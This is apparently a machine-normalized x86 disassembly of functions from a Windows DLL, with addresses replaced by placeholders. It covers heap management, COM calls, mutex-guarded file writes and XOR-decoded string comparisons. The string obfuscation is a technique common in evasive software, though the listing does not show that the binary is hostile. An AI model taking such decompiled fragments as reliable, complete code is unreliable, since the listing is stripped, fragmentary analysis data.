mov esp ebp
pop ebp
retn 0x4
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
sub_1001f84c
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
jmp r-xdata
push [ ebp + 0x8 ]
call sub_1000b33e
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call sub_10046ed7
pop ecx
test eax eax
je r-xdata
leave
retn
test [ rw-data ] 0x1
mov edi rw-data
mov esi r--data
jne r-xdata
push edi
lea ecx [ ebp - 0x10 ]
call sub_1001f7a0
push r--data
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] esi
call sub_10024fe9
int3
or [ rw-data ] 0x1
push 0x1
lea eax [ ebp - 0x4 ]
push eax
mov ecx edi
mov [ ebp - 0x4 ] r--data
call sub_1004caf9
push sub_1008afa3
mov [ rw-data ] esi
call sub_100592b3
pop ecx
sub_1001f8d0
push ebp
mov ebp esp
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
lea edx [ esi + 0x8 ]
push edx
mov edx [ ebp + 0x8 ]
push r--data
push r--data
push edx
push eax
mov eax [ ecx + 0x20 ]
call eax
mov [ esi ] eax
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ esi ]
test eax eax
jns r-xdata
pop ebp
retn 0x4
call [ CoUninitialize@IAT ]
mov eax [ esi ]
sub_1001f910
push ebp
mov ebp esp
push 0xffffffff
push sub_100878b5
mov eax [ fs : 0x0 ]
push eax
sub esp 0x114
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
xor eax eax
cmp [ ebx + 0xec ] eax
jne r-xdata
cmp [ ebp + 0xc ] 0x1000
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x104 ] eax
jbe r-xdata
mov eax 0x42
jmp r-xdata
push 0x3
lea esi [ ebp - 0x100 ]
mov edi ebx
call sub_10057a60
xor eax eax
mov [ ebp - 0x4 ] eax
push 0x2
push r--data
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x50 ] 0xf
mov [ ebp - 0x54 ] eax
mov [ ebp - 0x64 ] al
call sub_10037e00
mov [ ebp - 0x4 ] 0x1
mov ecx [ ebp - 0xfc ]
mov esi [ ebp - 0x100 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
jne r-xdata
mov eax 0x1
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x8
push esi
lea eax [ ebp - 0x100 ]
call sub_100629b0
push eax
push ebx
lea edi [ ebp - 0x64 ]
call sub_10059c40
mov ecx [ ebp - 0xfc ]
mov esi [ ebp - 0x100 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov edi edx
shr edi 0x1f
add edi edx
jne r-xdata
push r--data
call sub_1002d84e
push esi
push ebx
lea eax [ ebp - 0x100 ]
call sub_10064570
mov ecx [ esi + 0x10 ]
mov edx [ ebx + 0x50 ]
mov [ ebp - 0x11c ] eax
mov [ ebp - 0x114 ] ecx
cmp edi 0x1
ja r-xdata
push r--data
call sub_1002d84e
mov eax [ esi + 0x2c ]
mov [ ebp - 0x110 ] eax
cmp edi 0x2
ja r-xdata
push r--data
call sub_1002d84e
mov ecx [ ebx + 0x108 ]
mov eax [ esi + 0x48 ]
add ecx 0x7
lea eax [ eax + ecx * 2 ]
add eax ecx
add eax [ ebp - 0x110 ]
mov ecx [ ebp + 0xc ]
add eax [ ebp - 0x114 ]
add eax edx
cmp ecx eax
ja r-xdata
push r--data
call sub_1002d84e
sub ecx eax
push ecx
lea edx [ ebp - 0x2c ]
push edx
mov [ ebp - 0x120 ] ecx
call sub_10041240
push eax
lea eax [ ebp - 0xd4 ]
push r--data
push eax
mov [ ebp - 0x4 ] 0x2
call sub_10057800
add esp 0xc
mov [ ebp - 0x4 ] 0x4
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
cmp [ ebp - 0x50 ] 0x10
jb r-xdata
mov ecx [ ebp - 0xfc ]
mov esi [ ebp - 0x100 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x2c ] 0x0
cmp eax 0x1
ja r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_100187af
add esp 0x4
lea ecx [ ebp - 0x100 ]
mov [ ebp - 0x50 ] 0xf
mov [ ebp - 0x54 ] 0x0
mov [ ebp - 0x64 ] 0x0
call sub_1006cee0
mov eax 0x2
jmp r-xdata
mov ecx [ ebp - 0x64 ]
push ecx
call sub_100187af
add esp 0x4
lea eax [ esi + 0x1c ]
push eax
lea eax [ ebp - 0x100 ]
call sub_100629b0
push eax
push ebx
lea edi [ ebp - 0xd4 ]
call sub_10059c40
mov ecx [ ebp - 0xfc ]
mov esi [ ebp - 0x100 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ecx 0x1
ja r-xdata
push r--data
call sub_1002d84e
lea eax [ esi + 0x1c ]
push eax
push ebx
lea eax [ ebp - 0x100 ]
call sub_10064570
push 0x227a9
lea esi [ ebp - 0xf0 ]
mov [ ebp - 0x114 ] eax
call sub_1003e830
push eax
lea edx [ ebp - 0xb8 ]
push r--data
push edx
mov [ ebp - 0x4 ] 0x5
call sub_10057800
add esp 0x10
mov [ ebp - 0x4 ] 0x7
cmp [ ebp - 0xdc ] 0x10
jb r-xdata
push r--data
call sub_1002d84e
mov ecx [ ebp - 0xfc ]
mov esi [ ebp - 0x100 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
mov [ ebp - 0xdc ] 0xf
mov [ ebp - 0xe0 ] 0x0
mov [ ebp - 0xf0 ] 0x0
cmp ecx 0x2
ja r-xdata
mov eax [ ebp - 0xf0 ]
push eax
call sub_100187af
add esp 0x4
lea eax [ esi + 0x38 ]
push eax
lea eax [ ebp - 0x100 ]
call sub_100629b0
push eax
push ebx
lea edi [ ebp - 0xb8 ]
call sub_10059c40
mov ecx [ ebp - 0xfc ]
mov esi [ ebp - 0x100 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x2
ja r-xdata
push r--data
call sub_1002d84e
lea eax [ esi + 0x38 ]
push eax
push ebx
lea eax [ ebp - 0x100 ]
call sub_10064570
mov ecx [ ebp - 0x11c ]
push ecx
lea edx [ ebp - 0x9c ]
push edx
mov [ ebp - 0x110 ] eax
call sub_10041240
mov esi eax
lea eax [ ebp - 0x64 ]
push eax
lea ecx [ ebp - 0x48 ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x8
call sub_100403d0
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x9
call sub_1000be00
mov ecx eax
mov [ ebp - 0x4 ] 0xa
mov esi [ ebp - 0xfc ]
mov edi [ ebp - 0x100 ]
sub esi edi
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
jne r-xdata
push r--data
call sub_1002d84e
push 0xffffffff
push 0x0
push ecx
mov ecx edi
call sub_1005e580
mov edi 0x10
cmp [ ebp - 0x18 ] edi
jb r-xdata
push r--data
call sub_1002d84e
mov esi 0xf
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x2c ] 0x0
cmp [ ebp - 0x34 ] edi
jb r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_100187af
add esp 0x4
mov [ ebp - 0x4 ] 0x7
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x38 ] 0x0
mov [ ebp - 0x48 ] 0x0
cmp [ ebp - 0x88 ] edi
jb r-xdata
mov edx [ ebp - 0x48 ]
push edx
call sub_100187af
add esp 0x4
mov ecx [ ebp - 0x114 ]
push ecx
lea edx [ ebp - 0x9c ]
push edx
call sub_10041240
mov esi eax
lea eax [ ebp - 0xd4 ]
push eax
lea ecx [ ebp - 0x2c ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0xb
call sub_100403d0
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0xc
call sub_1000be00
mov esi eax
mov [ ebp - 0x4 ] 0xd
mov ecx [ ebp - 0xfc ]
mov edi [ ebp - 0x100 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x1
ja r-xdata
mov eax [ ebp - 0x9c ]
push eax
call sub_100187af
add esp 0x4
push 0xffffffff
push 0x0
lea ecx [ edi + 0x1c ]
push esi
call sub_1005e580
mov esi 0x10
cmp [ ebp - 0x34 ] esi
jb r-xdata
push r--data
call sub_1002d84e
mov edi 0xf
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x38 ] 0x0
mov [ ebp - 0x48 ] 0x0
cmp [ ebp - 0x18 ] esi
jb r-xdata
mov ecx [ ebp - 0x48 ]
push ecx
call sub_100187af
add esp 0x4
mov [ ebp - 0x4 ] 0x7
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x2c ] 0x0
cmp [ ebp - 0x88 ] esi
jb r-xdata
mov edx [ ebp - 0x2c ]
push edx
call sub_100187af
add esp 0x4
mov ecx [ ebp - 0x110 ]
push ecx
lea edx [ ebp - 0x9c ]
push edx
call sub_10041240
mov esi eax
lea eax [ ebp - 0xb8 ]
push eax
lea ecx [ ebp - 0x2c ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0xe
call sub_100403d0
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0xf
call sub_1000be00
mov esi eax
mov [ ebp - 0x4 ] 0x10
mov ecx [ ebp - 0xfc ]
mov edi [ ebp - 0x100 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x2
ja r-xdata
mov eax [ ebp - 0x9c ]
push eax
call sub_100187af
add esp 0x4
push 0xffffffff
push 0x0
lea ecx [ edi + 0x38 ]
push esi
call sub_1005e580
mov esi 0x10
cmp [ ebp - 0x34 ] esi
jb r-xdata
push r--data
call sub_1002d84e
mov edi 0xf
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x38 ] 0x0
mov [ ebp - 0x48 ] 0x0
cmp [ ebp - 0x18 ] esi
jb r-xdata
mov ecx [ ebp - 0x48 ]
push ecx
call sub_100187af
add esp 0x4
mov [ ebp - 0x4 ] 0x7
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x2c ] 0x0
cmp [ ebp - 0x88 ] esi
jb r-xdata
mov edx [ ebp - 0x2c ]
push edx
call sub_100187af
add esp 0x4
lea ecx [ ebp - 0x80 ]
push ecx
lea edi [ ebp - 0x100 ]
call sub_10044960
mov [ ebp - 0x4 ] 0x11
mov eax [ ebp - 0x80 ]
xor edi edi
mov esi 0x10
mov [ ebp - 0x118 ] edi
cmp [ ebp - 0x6c ] esi
jae r-xdata
mov eax [ ebp - 0x9c ]
push eax
call sub_100187af
add esp 0x4
mov ebx [ ebx + 0xec ]
mov edx [ ebx ]
mov edx [ edx + 0x8 ]
lea ecx [ ebp - 0x108 ]
push ecx
lea ecx [ ebp - 0x104 ]
push ecx
lea ecx [ ebp - 0x118 ]
push ecx
mov ecx [ ebp - 0x70 ]
push ecx
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx ebx
call edx
test eax eax
jne r-xdata
lea eax [ ebp - 0x80 ]
mov ecx [ ebp - 0x104 ]
mov [ ebp - 0x10c ] 0x3
cmp [ ebp - 0x118 ] 0xc8
jne r-xdata
cmp [ ebp - 0x6c ] esi
jb r-xdata
push ecx
push edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov [ ebp - 0x104 ] edi
mov ecx [ ebp - 0x104 ]
cmp ecx edi
je r-xdata
mov ebx 0x10
mov esi 0xf
mov [ ebp - 0x6c ] esi
mov [ ebp - 0x70 ] edi
mov [ ebp - 0x80 ] 0x0
cmp [ ebp - 0xa4 ] ebx
jb r-xdata
mov eax [ ebp - 0x80 ]
push eax
call sub_100187af
add esp 0x4
mov [ ebp - 0x10c ] 0x4
jmp r-xdata
cmp [ ecx ] al
je r-xdata
mov [ ebp - 0xa4 ] esi
mov [ ebp - 0xa8 ] edi
mov [ ebp - 0xb8 ] 0x0
cmp [ ebp - 0xc0 ] ebx
jb r-xdata
mov ecx [ ebp - 0xb8 ]
push ecx
call sub_100187af
add esp 0x4
cmp ecx edi
je r-xdata
mov eax [ ebp - 0x108 ]
mov dl [ eax + ecx - 0x1 ]
cmp dl 0xa
je r-xdata
mov [ ebp - 0xc0 ] esi
mov [ ebp - 0xc4 ] edi
mov [ ebp - 0xd4 ] 0x0
cmp [ ebp - 0x50 ] ebx
jb r-xdata
mov edx [ ebp - 0xd4 ]
push edx
call sub_100187af
add esp 0x4
mov [ eax + ecx - 0x1 ] 0x0
mov eax [ ebp - 0x108 ]
mov ecx [ ebp - 0x104 ]
dec eax
mov [ ebp - 0x108 ] eax
cmp dl 0x20
jne r-xdata
lea ecx [ ebp - 0x100 ]
mov [ ebp - 0x50 ] esi
mov [ ebp - 0x54 ] edi
mov [ ebp - 0x64 ] 0x0
call sub_1006cee0
mov eax [ ebp - 0x10c ]
mov eax [ ebp - 0x64 ]
push eax
call sub_100187af
add esp 0x4
cmp [ ebp - 0x120 ] eax
je r-xdata
push ecx
lea ecx [ ebp - 0x108 ]
call sub_1003cd30
mov ecx [ ebp - 0x104 ]
mov eax [ ebp - 0x108 ]
cmp eax edi
je r-xdata
mov [ ebp - 0x10c ] 0x5
jmp r-xdata
sub_10020110
push ebp
mov ebp esp
sub esp 0x60
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
push esi
push edi
xor edi edi
lea edx [ ebp - 0x4c ]
mov [ ebp - 0x54 ] eax
mov [ ebp - 0x4c ] edi
call sub_100221d0
mov [ ebp - 0x50 ] eax
cmp eax edi
je r-xdata
push 0x4
push edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
cmp eax edi
je r-xdata
lea edx [ ebp - 0x48 ]
mov eax 0xc4
call sub_10053240
mov esi [ ebp - 0x4c ]
cmp esi edi
je r-xdata
inc [ edi ]
lea eax [ ebp - 0x5c ]
cmp ebx eax
je r-xdata
mov [ eax ] edi
mov edi eax
mov esi [ ebp - 0x54 ]
mov eax [ esi ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x50 ]
pop edi
mov [ esi ] 0x0
xor ecx ebp
pop esi
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x8
call sub_10055530
jmp r-xdata
mov esi [ ebp - 0x4c ]
mov eax [ ebx + 0x4 ]
dec [ eax ]
jne r-xdata
test esi esi
je r-xdata
mov esi [ ebp - 0x4c ]
mov [ ebx ] esi
mov [ ebx + 0x4 ] edi
inc [ edi ]
jmp r-xdata
mov esi [ ebx ]
test esi esi
je r-xdata
push edi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
call sub_10055530
dec [ edi ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
call sub_10055530
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
sub_10020228
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax [ esi + 0x14 ]
push edi
push [ ebp + 0x20 ]
mov edi [ ebp + 0x8 ]
push [ ebp + 0x1c ]
mov ebx ecx
push eax
push r--data
lea eax [ ebp - 0xc ]
push eax
push ebx
call sub_1005efca
add esp 0x10
push eax
lea eax [ ebp - 0x4c ]
push 0x40
push eax
call sub_1005c1c5
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push ebx
call sub_1001caa1
mov ecx [ ebp - 0x4 ]
add esp 0x34
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10001e8b
leave
retn 0x1c
sub_10020299
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10012e73
add esp 0x1c
pop ebp
retn
sub_100202e0
push ebp
mov ebp esp
push 0xffffffff
push sub_10087e6c
mov eax [ fs : 0x0 ]
push eax
sub esp 0x80
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
mov [ esi ] r--data
mov edx [ edi ]
lea ecx [ esi + 0xc ]
mov [ ecx + 0x10 ] eax
mov [ ecx + 0x14 ] 0x7
mov [ ecx ] ax
mov eax edx
lea ebx [ eax + 0x2 ]
mov [ ebp - 0x8c ] esi
mov [ ebp - 0x88 ] ebx
lea ebx [ ebx ]
mov bx [ eax ]
add eax 0x2
test bx bx
jne r-xdata
sub eax [ ebp - 0x88 ]
sar eax 0x1
push eax
push edx
call sub_1005ddc0
xor edx edx
mov [ ebp - 0x4 ] edx
mov eax [ edi + 0x20 ]
mov [ esi + 0x28 ] eax
xor ecx ecx
mov [ esi + 0x40 ] 0x7
mov [ esi + 0x3c ] edx
mov [ esi + 0x2c ] cx
mov [ ebp - 0x4 ] 0x1
mov [ esi + 0x4c ] edx
mov eax [ edi + 0x2c ]
mov [ esi + 0x50 ] eax
mov ecx [ edi + 0x28 ]
mov [ esi + 0x54 ] ecx
mov eax [ edi + 0x24 ]
mov [ esi + 0x58 ] eax
mov ecx [ edi + 0x4c ]
mov [ esi + 0x5c ] ecx
mov eax [ edi + 0x48 ]
mov [ esi + 0x60 ] eax
mov ecx [ r--data ]
xor eax eax
movsx ebx [ eax + ecx ]
xor ebx eax
xor ebx 0xff99
and ebx 0xff
mov [ ebp + eax * 2 - 0x50 ] bx
inc eax
cmp eax 0x8
jb r-xdata
xor ecx ecx
mov [ ebp - 0x40 ] cx
mov ecx [ r--data ]
xor eax eax
lea ecx [ ecx ]
movsx ebx [ eax + ecx ]
xor ebx eax
xor ebx 0xffc4
and ebx 0xff
mov [ ebp + eax * 2 - 0x84 ] bx
inc eax
cmp eax 0xc
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x6c ] ax
lea esp [ esp ]
movsx ebx [ eax + ecx ]
xor ebx eax
xor ebx 0x22
and ebx 0xff
mov [ ebp + eax * 2 - 0x2c ] bx
inc eax
cmp eax 0x7
jb r-xdata
xor ecx ecx
mov [ ebp - 0x1e ] cx
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
movsx ebx [ eax + ecx ]
xor ebx eax
xor ebx 0xffd5
and ebx 0xff
mov [ ebp + eax * 2 - 0x3c ] bx
inc eax
cmp eax 0x7
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x2e ] ax
lea esp [ esp ]
movsx ebx [ ecx + eax ]
xor ebx eax
xor ebx 0x63
and ebx 0xff
mov [ ebp + eax * 2 - 0x1c ] bx
inc eax
cmp eax 0x5
jb r-xdata
xor ecx ecx
mov [ ebp - 0x12 ] cx
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x63
and edx 0xff
mov [ ebp + eax * 2 - 0x68 ] dx
inc eax
cmp eax 0xa
jb r-xdata
mov ebx [ lstrcmpW@IAT ]
xor eax eax
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x54 ] ax
mov eax [ edi + 0x1c ]
push ecx
push eax
call ebx
test eax eax
jne r-xdata
mov eax [ edi + 0x1c ]
lea edx [ ebp - 0x3c ]
push edx
push eax
call ebx
test eax eax
jne r-xdata
mov [ esi + 0x48 ] 0x1
jmp r-xdata
mov eax [ edi + 0x1c ]
lea ecx [ ebp - 0x84 ]
push ecx
push eax
call ebx
test eax eax
jne r-xdata
mov [ esi + 0x48 ] 0x2
jmp r-xdata
mov edx [ edi + 0x8 ]
mov eax edx
lea ebx [ eax + 0x2 ]
jmp r-xdata
mov eax [ edi + 0x1c ]
lea edx [ ebp - 0x50 ]
push edx
push eax
call ebx
test eax eax
jne r-xdata
mov [ esi + 0x48 ] 0x3
jmp r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
mov eax [ edi + 0x1c ]
lea ecx [ ebp - 0x1c ]
push ecx
push eax
call ebx
test eax eax
jne r-xdata
mov [ esi + 0x48 ] 0x4
jmp r-xdata
sub eax ebx
sar eax 0x1
push eax
push edx
lea ecx [ esi + 0x2c ]
call sub_1005ddc0
mov eax [ edi + 0x40 ]
mov [ esi + 0x68 ] eax
mov ecx [ edi + 0x44 ]
mov [ esi + 0x6c ] ecx
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov eax [ edi + 0x1c ]
lea edx [ ebp - 0x68 ]
push edx
push eax
call ebx
neg eax
sbb eax eax
and eax 0xfffffffa
add eax 0x6
mov [ esi + 0x48 ] eax
mov [ esi + 0x48 ] 0x5
jmp r-xdata
sub_100205a0
push ebp
mov ebp esp
push 0xffffffff
push sub_100887e0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x64
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
movzx esi cx
xor eax eax
xor ecx ecx
mov edi edx
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x2c ] cx
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
call [ GetProcessHeap@IAT ]
mov ebx eax
mov eax [ rw-data ]
mov [ ebp - 0x50 ] ebx
test eax eax
je r-xdata
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x2c ]
push eax
lea edx [ ebp - 0x48 ]
push edx
mov ecx edi
mov edx esi
call sub_10045520
add esp 0x4
push eax
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x1
call sub_100649e0
mov edi 0x8
cmp [ ebp - 0x34 ] edi
jb r-xdata
mov esi [ ebp - 0x1c ]
add esi esi
lea ecx [ esi + 0x1 ]
push ecx
push edi
push ebx
call [ HeapAlloc@IAT ]
mov [ ebp - 0x5c ] eax
cmp [ ebp - 0x18 ] edi
jb r-xdata
mov eax [ ebp - 0x48 ]
push eax
call sub_100187af
add esp 0x4
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4c ] ecx
mov edx [ ebp - 0x2c ]
mov [ ebp - 0x4c ] edx
jmp r-xdata
mov ecx [ rw-data ]
push ecx
call [ ReleaseMutex@IAT ]
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
cmp esi [ ebp - 0x58 ]
jne r-xdata
lea edx [ ebp - 0x68 ]
mov [ ebp - 0x54 ] eax
push edx
lea eax [ ebp - 0x54 ]
push eax
lea ecx [ ebp - 0x4c ]
push ecx
lea edi [ ebp - 0x64 ]
lea edx [ ebp - 0x6c ]
lea ebx [ ebp - 0x60 ]
mov [ ebp - 0x60 ] esi
call sub_10070ca0
mov edx [ rw-data ]
add esp 0xc
push 0xffffffff
push edx
call [ WaitForSingleObject@IAT ]
mov edi [ ebp - 0x5c ]
mov ecx [ rw-data ]
push 0x0
lea eax [ ebp - 0x58 ]
push eax
push esi
push edi
push ecx
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov edx [ ebp - 0x2c ]
push edx
jmp r-xdata
mov edx [ rw-data ]
push edx
call [ ReleaseMutex@IAT ]
test edi edi
je r-xdata
call sub_100187af
add esp 0x4
lea ecx [ ebp - 0x2c ]
call sub_10019100
jmp r-xdata
mov eax [ ebp - 0x50 ]
push edi
push 0x0
push eax
call [ HeapFree@IAT ]
sub_1002072e
mov edi edi
push ebp
mov ebp esp
sub esp 0x74
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
movzx eax [ ebp + 0x10 ]
movzx edx [ ebp + 0x10 ]
mov ecx 0x8000
and eax ecx
push ebx
mov ebx [ ebp + 0x1c ]
mov [ ebp - 0x60 ] eax
lea eax [ ecx - 0x1 ]
push esi
and edx eax
cmp [ ebp - 0x60 ] 0x0
push edi
mov [ ebp - 0x64 ] ebx
mov [ ebp - 0x30 ] 0xcccccccc
mov [ ebp - 0x2c ] 0xcccccccc
mov [ ebp - 0x28 ] 0x3ffbcccc
mov [ ebp - 0x74 ] 0x1
je r-xdata
mov [ ebx + 0x2 ] 0x20
mov [ ebx + 0x2 ] 0x2d
jmp r-xdata
cmp dx ax
jne r-xdata
test esi esi
jne r-xdata
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
test dx dx
jne r-xdata
movzx ecx dx
mov ebx ecx
imul ecx ecx 0x4d10
mov eax esi
shr eax 0x18
shr ebx 0x8
lea eax [ ebx + eax * 2 ]
imul eax eax 0x4d
lea eax [ eax + ecx - 0x134312f4 ]
sar eax 0x10
movzx eax ax
xor ecx ecx
mov [ ebp - 0x20 ] cx
movsx ebx ax
mov ecx rw-data
sub ecx 0x60
neg ebx
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x16 ] dx
mov [ ebp - 0x1a ] esi
mov [ ebp - 0x1e ] edi
mov [ ebp - 0x68 ] ecx
je r-xdata
mov ecx [ ebp + 0xc ]
xor eax eax
inc eax
mov [ ebx ] ax
mov eax 0x80000000
cmp ecx eax
jne r-xdata
test edi edi
jne r-xdata
mov ecx [ ebp - 0x18 ]
shr ecx 0x10
mov edx 0x3fff
mov eax 0x7fff
cmp cx dx
jb r-xdata
test ebx ebx
jns r-xdata
test ecx 0x40000000
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor eax eax
cmp [ ebp - 0x60 ] cx
mov [ ebx ] ax
setne al
dec al
and al 0xd
add al 0x20
mov [ ebx + 0x2 ] al
mov [ ebx + 0x3 ] 0x3001
mov [ ebx + 0x5 ] 0x0
test [ ebp + 0x18 ] 0x1
mov edx [ ebp - 0x64 ]
mov eax [ ebp - 0x4c ]
mov edi [ ebp + 0x14 ]
mov [ edx ] ax
je r-xdata
mov ebx [ ebp - 0x26 ]
inc [ ebp - 0x4c ]
xor edx edx
mov [ ebp - 0x50 ] edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] edx
mov edx [ ebp - 0x26 ]
xor ebx ecx
and ecx eax
and edx eax
and ebx 0x8000
lea esi [ edx + ecx ]
mov [ ebp - 0x5c ] ebx
movzx esi si
cmp cx ax
jae r-xdata
je r-xdata
mov eax rw-data
sub eax 0x60
neg ebx
mov [ ebp - 0x68 ] eax
test ebx ebx
xor edx edx
cmp [ ebp - 0x60 ] dx
je r-xdata
push r--data
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10001e8b
leave
retn
cmp edi 0x15
jle r-xdata
cwde
add edi eax
test edi edi
jg r-xdata
xor eax eax
test bx bx
sete al
and [ ebp - 0x1c ] 0x0
dec eax
and eax 0x80000000
add eax 0x7fff8000
and [ ebp - 0x20 ] 0x0
cmp dx ax
jae r-xdata
add [ ebp - 0x68 ] 0x54
mov ecx ebx
sar ebx 0x3
and ecx 0x7
je r-xdata
cmp ecx eax
jne r-xdata
cmp ecx 0xc0000000
jne r-xdata
lea eax [ ebx + 0x4 ]
push 0x16
push eax
call sub_10057f0f
add esp 0xc
test eax eax
jne r-xdata
mov esi [ ebp - 0x18 ]
shr esi 0x10
sub esi 0x3ffe
xor eax eax
mov [ ebp - 0x16 ] ax
mov [ ebp - 0x44 ] 0x8
push 0x15
pop edi
xor eax eax
mov [ edx ] ax
mov eax 0x8000
cmp [ ebp - 0x60 ] ax
mov [ edx + 0x3 ] 0x3001
setne al
dec al
and al 0xd
add al 0x20
mov [ edx + 0x2 ] al
mov [ edx + 0x5 ] 0x0
jmp r-xdata
mov eax 0xbffd
cmp si ax
ja r-xdata
xor esi esi
imul ecx ecx 0xc
add ecx [ ebp - 0x68 ]
mov eax ecx
mov [ ebp - 0x44 ] ecx
mov ecx 0x8000
